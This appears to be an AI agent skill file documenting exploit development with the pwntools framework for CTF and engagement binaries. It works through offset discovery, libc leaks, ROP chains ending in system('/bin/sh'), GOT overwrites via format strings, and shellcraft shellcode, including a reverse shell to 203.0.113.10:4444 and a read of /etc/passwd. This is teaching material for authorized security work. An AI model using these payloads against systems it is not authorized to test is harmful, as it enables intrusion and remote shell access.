---
name: pwntools
description: Exploit development with the pwntools framework — context/ELF/libc setup, process/remote/ssh tubes, packing and cyclic offset discovery, ROP objects, shellcraft shellcode, gdb integration, and the fmtstr helper; use when writing, debugging, or running a binary-exploitation PoC against a local binary or a remote service.
compatibility: linux, python3, pwntools>=4.x
metadata:
  author: Section9Labs
---

# pwntools

pwntools is the standard CTF/engagement exploit framework. One script should drive the
whole lifecycle: find the offset, leak, compute, exploit, get a shell — locally, under
gdb, and against the remote, switched only by argv.

Start every exploit from `scripts/exploit_skeleton.py` (runnable template with the
local/remote/ssh/GDB switch and a ret2libc scaffold already laid out).

## 1. Context — always first

```python
from pwn import *

context.binary = ELF("./target")   # sets context.arch/bits/endian/os from the ELF
context.log_level = "debug"        # show every byte sent/received; 'info' when stable
context.terminal = ["tmux", "splitw", "-h"]   # where gdb.attach opens its window
```

`context.binary` is the single most important line: it makes `asm()`, `p64/p32`,
`ROP()`, `cyclic()`, `shellcraft`, and `gdb` all agree on arch/bits/endianness.
Read the mitigations it prints (`checksec` output: RELRO/Canary/NX/PIE) — they decide
the technique (NX ⇒ load the `rop-chains` skill; canary ⇒ need a leak or fmtstr first).

## 2. ELF and libc objects

```python
elf  = context.binary                 # same ELF object
libc = ELF("./libc.so.6")             # remote libc; locally use elf.libc

elf.symbols["main"]                   # function/object addresses
elf.got["puts"]                       # GOT slot (read it to leak libc)
elf.plt["puts"]                       # PLT stub (call it to run puts)
next(elf.search(b"/bin/sh"))          # find bytes in the binary
next(libc.search(b"/bin/sh"))         # ...or in libc (usual system() argument)

# PIE / ASLR rebasing: all addresses in elf/libc are offsets until .address is set.
elf.address  = leak - elf.symbols["main"]      # after a PIE code-pointer leak
libc.address = leak - libc.symbols["puts"]     # after a GOT/stack libc leak
log.info(f"libc base: {hex(libc.address)}")    # must end in 000
```

After setting `.address`, every `symbols/got/plt/search` result is absolute — build the
second stage with the same objects. If the remote libc is unknown, leak 2+ symbols and
hand the low-12-bit offsets to the `libc-identification` skill, then come back with the
matching `libc.so.6`.

## 3. Tubes and the local/remote switch

```python
p = process("./target")                               # local
p = process(["./target", "arg"], env={"X": "1"})
p = remote("203.0.113.10", 1337)                      # TCP
s = ssh(host="192.0.2.5", user="ctf", keyfile="~/.ssh/id_ed25519")
p = s.process("./target")                             # run on the remote box

# argv-driven switch (pwntools parses UPPERCASE argv words into `args`):
#   python3 exploit.py                -> local
#   python3 exploit.py GDB            -> local under gdb
#   python3 exploit.py REMOTE HOST=203.0.113.10 PORT=1337
def start():
    if args.REMOTE:
        return remote(args.HOST or "203.0.113.10", int(args.PORT or 1337))
    if args.GDB:
        return gdb.debug(elf.path, gdbscript="b *main\nc")
    return process(elf.path)
```

I/O primitives (full patterns in `references/tubes-io.md`):

```python
p.recvuntil(b"name: ")        # sync to a prompt — always anchor before sending
p.recvline()                  # one line incl. \n (keepends=False to strip)
p.recvn(8)                    # exactly n bytes
p.recvregex(rb"0x[0-9a-f]+")  # until regex matches
p.sendline(payload)           # payload + \n
p.send(payload)               # raw, no newline (binary protocols, exact reads)
p.sendlineafter(b"> ", b"1")  # recvuntil + sendline in one call
p.sendafter(b"> ", payload)
p.clean(timeout=0.5)          # drain pending bytes before a critical read
p.interactive()               # hand the shell to the operator — always end with this
```

## 4. Packing, leak parsing, offsets

```python
p64(0xdeadbeef)                      # 8-byte LE; p32 for 32-bit
u64(leak.ljust(8, b"\x00"))          # unpack a short leak (puts stops at NUL —
                                     # a 64-bit userland address prints as 6 bytes)
u32(p.recvn(4))

payload = flat({72: [rop.chain()]})  # auto-pad to offset 72, pack per context
payload = fit({64: p64(canary), 72: p64(rbp), 80: chain})
cyclic(200)                          # de Bruijn pattern to crash with
cyclic_find(0x6161616c)              # offset of the faulting value
cyclic_find(core.read(core.rsp, 4))  # 64-bit: RIP is non-canonical, read RSP instead
```

Offset discovery, end to end: crash with `cyclic(N)`, grab the corefile
(`core = p.corefile`), then `cyclic_find(core.eip)` (32-bit) or
`cyclic_find(core.read(core.rsp, 4))` (64-bit). The skeleton script automates this.

## 5. ROP objects

```python
rop = ROP(elf)                                   # gadgets from the binary
rop.call("system", [next(elf.search(b"/bin/sh"))])
rop.puts(elf.got["puts"])                        # any PLT entry is a method
rop.call(elf.symbols["main"])                    # return to main for stage 2
rop.raw(rop.find_gadget(["ret"])[0])             # 16-byte stack alignment pad
rop.raw(0xdeadbeef)                              # arbitrary word
rop.find_gadget(["pop rdi", "ret"])[0]           # address of a specific gadget
rop.migrate(elf.bss(0x100))                      # stack pivot (leave;ret / pop rsp)
print(rop.dump())                                # ALWAYS review before sending
payload = flat({offset: rop.chain()})
```

Build the second stage on `ROP(libc)` after `libc.address` is set. For
`Ret2dlresolvePayload`, SROP (`SigreturnFrame()`), gadget hunting with
ROPgadget/ropper, and one_gadget: load the `rop-chains` skill — it owns chain
construction; this skill owns delivery.

## 6. Shellcode (shellcraft)

```python
context.arch = "amd64"                     # or let context.binary set it
sc = asm(shellcraft.sh())                  # execve("/bin/sh") for context arch
sc = asm(shellcraft.amd64.linux.sh())      # explicit arch/os
sc = asm(shellcraft.cat("/etc/passwd"))    # open/sendfile a file
sc = asm(shellcraft.connect("203.0.113.10", 4444) + shellcraft.dupsh())  # reverse sh
print(shellcraft.sh())                     # inspect the asm source
print(disasm(sc))                          # verify the bytes
constants.SYS_execve, constants.PROT_READ | constants.PROT_EXEC   # kernel constants
```

Shellcode needs an RWX destination: an executable stack (checksec NX disabled), an
`mprotect` ROP/SROP stage, or JIT pages. Otherwise stick to ROP.

## 7. Debugging integration

```python
gdb.attach(p, gdbscript="b *0x401234\nc")          # attach to a running tube
p = gdb.debug(elf.path, gdbscript="b main\nc")     # launch under gdb from the start
pause()                                            # manual attach checkpoint
```

`gdb.debug` catches crashes before `main`; `gdb.attach` is for breaking mid-protocol.
Gate both behind `args.GDB`. Breakpoint math under PIE: run once, read the base from
`vmmap`, or use `b *$rebase(0x1234)` with gef/pwndbg. For memory-layout and
watchpoint technique, load the `gdb-debugging` skill.

## 8. Format strings

```python
payload = fmtstr_payload(offset, {elf.got["printf"]: libc.symbols["system"]})
p.sendline(payload)   # then send "/bin/sh" as the next printf argument
```

`offset` is the printf argument index where your input appears (find with
`%p.%p.%p...` or `FmtStr(execute_fmt=...)`). Full methodology — leaking the stack,
canary, PIE/libc pointers, and GOT overwrites — is in the
`format-string-exploitation` skill.

## 9. Standard workflow

1. `context.binary = ELF("./target")`; read checksec; pick technique.
2. Find the overflow offset with `cyclic`/corefile (skeleton: `FIND_OFFSET=1`).
3. Stage 1: leak — `rop.puts(elf.got["puts"])` + return to `main`
   (ret2plt; chain layout in `rop-chains`). Parse with
   `u64(p.recvline(keepends=False).ljust(8, b"\x00"))`.
4. Resolve: `libc.address = leak - libc.symbols["puts"]` (unknown libc ⇒
   `libc-identification` skill first).
5. Stage 2: `ret` pad + `system("/bin/sh")`, or one_gadget, or execve chain.
6. `p.interactive()`; verify locally, then rerun with `REMOTE HOST=... PORT=...`.
7. Keep the final script and transcript — the script IS the PoC artifact; record
   assets/findings per `references/rupu.md` (binary:file → `exploited`).

## References

- `references/pwntools.md` — full tubes/ELF/ROP/packing/shellcraft/util reference.
- `references/tubes-io.md` — recv/send patterns, leak-parsing recipes, timeout and
  EOF handling, menu-driven-binary helpers.
- `references/rupu.md` — asset/finding/work-unit wiring for rupu.
- Siblings: `rop-chains`, `libc-identification`, `gdb-debugging`,
  `format-string-exploitation`, umbrella `binary-analysis`.
